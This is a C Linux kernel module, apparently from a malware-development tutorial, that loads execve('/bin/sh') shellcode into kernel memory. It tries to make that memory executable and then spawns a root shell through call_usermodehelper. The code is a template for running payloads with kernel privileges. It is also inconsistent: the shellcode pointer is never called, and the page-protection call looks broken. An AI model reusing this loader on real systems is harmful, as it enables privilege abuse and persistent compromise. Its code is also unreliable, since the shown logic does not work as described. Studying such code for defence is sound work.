#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <asm/page.h>  // For PAGE_ALIGN

MODULE_LICENSE("GPL");
MODULE_AUTHOR("cocomelonc");
MODULE_DESCRIPTION("local shellcode execution kernel module (simplified and safer, for edu)");

#define PAYLOAD "\x48\x31\xf6\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

static int __init shellcode_init(void) {
  unsigned char *code;
  void (*func)(void);  // Correct function pointer type

  // Allocate memory using vmalloc and page-align it
  code = (unsigned char *)vmalloc(PAGE_ALIGN(sizeof(PAYLOAD)));
  if (!code) {
    printk(KERN_ERR "vmalloc failed\n");
    return -ENOMEM;
  }

  memcpy(code, PAYLOAD, sizeof(PAYLOAD));

  // change memory protection to allow execution (RX)
  int ret = change_page_attr_addr(code, sizeof(PAYLOAD), PAGE_KERNEL_EXEC);

  if (ret < 0) {
    printk(KERN_ERR "change_page_attr_addr failed\n");
    vfree(code);
    return ret;
  }

  func = (void (*)(void))code;

  // Instead of directly executing, use call_usermodehelper
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};  //Pass a null terminated array.
  call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);

  printk(KERN_INFO "shellcode execution attempted\n");

  vfree(code);  // Free the allocated memory

  return 0;
}

static void __exit shellcode_exit(void) {
  printk(KERN_INFO "shellcode module unloaded\n");
}

module_init(shellcode_init);
module_exit(shellcode_exit);